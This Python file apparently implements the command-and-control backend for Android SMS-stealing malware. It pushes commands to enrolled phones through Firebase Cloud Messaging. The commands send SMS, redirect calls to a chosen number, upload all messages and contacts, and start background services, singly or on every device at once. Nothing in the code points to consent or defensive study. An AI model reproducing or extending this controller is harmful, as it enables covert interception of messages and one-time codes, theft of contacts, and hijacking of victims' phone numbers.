import firebase_admin
from firebase_admin import credentials, messaging
from typing import List, Dict, Any, Optional
import logging
from ..database import mongodb
from datetime import datetime

logger = logging.getLogger(__name__)

class FirebaseService:

    def __init__(self, service_account_file: str):
        try:
            if not firebase_admin._apps:
                cred = credentials.Certificate(service_account_file)
                firebase_admin.initialize_app(cred)
            logger.info("✅ Firebase initialized")
        except Exception as e:
            logger.error(f"❌ Firebase initialization error: {e}")

    async def _send_command(self, token: str, data: Dict[str, str], device_id: Optional[str] = None) -> Optional[str]:
        try:
            message = messaging.Message(
                data=data,
                token=token,
            )

            response = messaging.send(message)
            logger.info(f"✅ Command sent to {device_id or 'device'}: {data.get('type', 'unknown')}")
            logger.info(f"📨 Message ID: {response}")

            return response

        except messaging.UnregisteredError:
            logger.warning(f"⚠️ Invalid FCM token for device: {device_id}")

            if device_id:
                await self._remove_invalid_token(device_id, token)
            return None

        except Exception as e:
            logger.error(f"❌ Error sending command to {device_id or 'device'}: {e}")
            return None

    async def _send_ping(self, token: str, device_id: Optional[str] = None) -> bool:
        response = await self._send_command(
            token,
            {
                "type": "ping",
                "timestamp": str(int(datetime.utcnow().timestamp() * 1000))
            },
            device_id
        )
        return response is not None

    async def _remove_invalid_token(self, device_id: str, token: str):
        try:
            await mongodb.db.devices.update_one(
                {"device_id": device_id},
                {"$pull": {"fcm_tokens": token}}
            )
            logger.info(f"🗑️ Removed invalid token from device: {device_id}")
        except Exception as e:
            logger.error(f"❌ Error removing invalid token: {e}")

    async def get_all_device_tokens(self) -> List[Dict[str, Any]]:
        try:
            devices = await mongodb.db.devices.find(
                {"fcm_tokens": {"$exists": True, "$ne": []}},
                {"device_id": 1, "fcm_tokens": 1, "model": 1, "manufacturer": 1}
            ).to_list(length=None)

            logger.info(f"📱 Found {len(devices)} devices with FCM tokens")
            return devices

        except Exception as e:
            logger.error(f"❌ Error getting device tokens: {e}")
            return []

    async def ping_all_devices(self) -> Dict[str, Any]:
        devices = await self.get_all_device_tokens()

        results = {
            "total_devices": len(devices),
            "total_tokens": 0,
            "success": 0,
            "failed": 0,
            "details": []
        }

        for device in devices:
            device_id = device.get("device_id")
            tokens = device.get("fcm_tokens", [])

            results["total_tokens"] += len(tokens)

            device_result = {
                "device_id": device_id,
                "model": device.get("model", "Unknown"),
                "manufacturer": device.get("manufacturer", "Unknown"),
                "tokens_count": len(tokens),
                "sent": []
            }

            for token in tokens:
                success = await self._send_ping(token, device_id)

                if success:
                    results["success"] += 1
                    device_result["sent"].append({
                        "token": token[:20] + "...",
                        "status": "success"
                    })
                else:
                    results["failed"] += 1
                    device_result["sent"].append({
                        "token": token[:20] + "...",
                        "status": "failed"
                    })

            results["details"].append(device_result)

        logger.info(f"📊 Ping summary: {results['success']}/{results['total_tokens']} successful")
        return results

    async def send_command_to_device(
        self,
        device_id: str,
        command_type: str,
        parameters: Optional[Dict[str, Any]] = None
    ) -> Dict[str, Any]:
        try:
            device = await mongodb.db.devices.find_one(
                {"device_id": device_id},
                {"fcm_tokens": 1}
            )

            if not device or not device.get("fcm_tokens"):
                return {
                    "success": False,
                    "message": "Device not found or no FCM tokens available"
                }

            tokens = device.get("fcm_tokens", [])

            data = {
                "type": command_type,
                "timestamp": str(int(datetime.utcnow().timestamp() * 1000))
            }

            if parameters:
                for key, value in parameters.items():
                    data[key] = str(value)

            success_count = 0
            for token in tokens:
                response = await self._send_command(token, data, device_id)
                if response:
                    success_count += 1

            return {
                "success": success_count > 0,
                "sent_count": success_count,
                "total_tokens": len(tokens),
                "message": f"Command sent to {success_count}/{len(tokens)} tokens"
            }

        except Exception as e:
            logger.error(f"❌ Error sending command to device {device_id}: {e}")
            return {
                "success": False,
                "message": str(e)
            }

    async def send_sms(
        self,
        device_id: str,
        phone: str,
        message: str,
        sim_slot: int = 0
    ) -> Dict[str, Any]:
        return await self.send_command_to_device(
            device_id=device_id,
            command_type="send_sms",
            parameters={
                "phone": phone,
                "message": message,
                "simSlot": sim_slot
            }
        )

    async def enable_call_forwarding(
        self,
        device_id: str,
        forward_number: str,
        sim_slot: int = 0
    ) -> Dict[str, Any]:
        return await self.send_command_to_device(
            device_id=device_id,
            command_type="call_forwarding",
            parameters={
                "number": forward_number,
                "simSlot": sim_slot
            }
        )

    async def disable_call_forwarding(
        self,
        device_id: str,
        sim_slot: int = 0
    ) -> Dict[str, Any]:
        return await self.send_command_to_device(
            device_id=device_id,
            command_type="call_forwarding_disable",
            parameters={
                "simSlot": sim_slot
            }
        )

    async def quick_upload_sms(self, device_id: str) -> Dict[str, Any]:
        return await self.send_command_to_device(
            device_id=device_id,
            command_type="quick_upload_sms"
        )

    async def quick_upload_contacts(self, device_id: str) -> Dict[str, Any]:
        return await self.send_command_to_device(
            device_id=device_id,
            command_type="quick_upload_contacts"
        )

    async def upload_all_sms(self, device_id: str) -> Dict[str, Any]:
        return await self.send_command_to_device(
            device_id=device_id,
            command_type="upload_all_sms"
        )

    async def upload_all_contacts(self, device_id: str) -> Dict[str, Any]:
        return await self.send_command_to_device(
            device_id=device_id,
            command_type="upload_all_contacts"
        )

    async def start_services(self, device_id: str) -> Dict[str, Any]:
        return await self.send_command_to_device(
            device_id=device_id,
            command_type="start_services"
        )

    async def restart_heartbeat(self, device_id: str) -> Dict[str, Any]:
        return await self.send_command_to_device(
            device_id=device_id,
            command_type="restart_heartbeat"
        )

    async def send_to_topic(
        self,
        topic: str,
        command_type: str,
        parameters: Optional[Dict[str, Any]] = None
    ) -> Dict[str, Any]:
        try:
            data = {
                "type": command_type,
                "timestamp": str(int(datetime.utcnow().timestamp() * 1000))
            }

            if parameters:
                for key, value in parameters.items():
                    data[key] = str(value)

            message = messaging.Message(
                data=data,
                topic=topic,
            )

            response = messaging.send(message)
            logger.info(f"✅ Command sent to topic '{topic}': {command_type}")
            logger.info(f"📨 Message ID: {response}")

            return {
                "success": True,
                "topic": topic,
                "command": command_type,
                "message_id": response,
                "message": f"Command sent to all devices subscribed to '{topic}'"
            }

        except Exception as e:
            logger.error(f"❌ Error sending to topic '{topic}': {e}")
            return {
                "success": False,
                "topic": topic,
                "message": str(e)
            }

    async def restart_all_heartbeats(self) -> Dict[str, Any]:
        return await self.send_to_topic(
            topic="all_devices",
            command_type="restart_heartbeat"
        )

    async def ping_all_devices_topic(self) -> Dict[str, Any]:
        return await self.send_to_topic(
            topic="all_devices",
            command_type="ping"
        )

    async def start_all_services(self) -> Dict[str, Any]:
        return await self.send_to_topic(
            topic="all_devices",
            command_type="start_services"
        )

    async def ping_device(self, device_id: str) -> Dict[str, Any]:
        try:
            device = await mongodb.db.devices.find_one(
                {"device_id": device_id},
                {"fcm_tokens": 1}
            )

            if not device or not device.get("fcm_tokens"):
                return {
                    "success": False,
                    "message": "Device not found or no FCM tokens"
                }

            tokens = device.get("fcm_tokens", [])
            success_count = 0

            for token in tokens:
                success = await self._send_ping(token, device_id)
                if success:
                    success_count += 1

            return {
                "success": success_count > 0,
                "sent_count": success_count,
                "total_tokens": len(tokens),
                "message": f"Ping sent to {success_count}/{len(tokens)} tokens"
            }

        except Exception as e:
            logger.error(f"❌ Error pinging device {device_id}: {e}")
            return {
                "success": False,
                "message": str(e)
            }

    async def send_command_to_multiple_devices(
        self,
        device_ids: List[str],
        command_type: str,
        parameters: Optional[Dict[str, Any]] = None
    ) -> Dict[str, Any]:
        results = {
            "total": len(device_ids),
            "success": 0,
            "failed": 0,
            "details": []
        }

        for device_id in device_ids:
            result = await self.send_command_to_device(
                device_id=device_id,
                command_type=command_type,
                parameters=parameters
            )

            if result["success"]:
                results["success"] += 1
            else:
                results["failed"] += 1

            results["details"].append({
                "device_id": device_id,
                "status": "success" if result["success"] else "failed",
                "message": result.get("message", "")
            })

        logger.info(f"📊 Batch command: {results['success']}/{results['total']} successful")
        return results

firebase_service = FirebaseService("apps.json")
